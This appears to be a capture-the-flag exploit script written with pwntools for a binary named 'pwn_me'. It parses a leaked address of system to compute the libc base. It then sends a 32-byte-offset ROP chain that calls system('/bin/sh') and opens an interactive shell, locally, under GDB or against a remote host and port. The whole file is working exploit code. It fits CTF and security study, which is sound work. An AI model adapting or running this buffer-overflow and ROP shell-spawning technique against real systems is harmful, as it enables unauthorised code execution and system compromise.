from pwn import *
import warnings
import re

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './pwn_me'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

libc = elf.libc

# Start program
io = start()

offset = 32

# Get system address
io.recvuntil('System is at:')
leak = io.recv()
address = re.findall(rb'0x[0-9a-zA-Z]+', leak)
system = address[0]
log.info(f"Leaked system address: { system } ")

# Calculate libc base address
libc.address = int(system, 16) - libc.symbols['system']
log.info(f"Libc base address: { hex(libc.address) } ")

rop = ROP(libc)
sh = next(libc.search(b'/bin/sh\x00'))
shell = rop.system(sh)
chain = rop.chain()

# Build the payload
payload = flat({
    offset: [
        chain
    ]
})

write('payload', payload)

io.sendline(payload)



io.interactive()
